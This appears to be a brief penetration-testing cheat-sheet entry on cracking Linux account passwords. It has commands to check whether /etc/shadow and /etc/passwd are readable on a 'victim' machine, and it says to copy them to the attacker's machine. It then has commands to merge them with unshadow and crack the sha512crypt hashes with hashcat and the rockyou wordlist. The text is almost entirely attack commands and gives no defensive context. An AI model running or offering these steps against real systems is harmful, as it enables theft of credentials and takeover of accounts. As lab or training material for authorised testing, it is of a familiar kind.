### Victim VM
```bash
$ ls -la /etc/shadow
$ ls -la /etc/passwd
```
If we have permissions to read, we can transfer this archives to our vm

### Attacker VM
```bash
$ unshadow passwd shadow > unshadowed.txt
$ hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt -O
```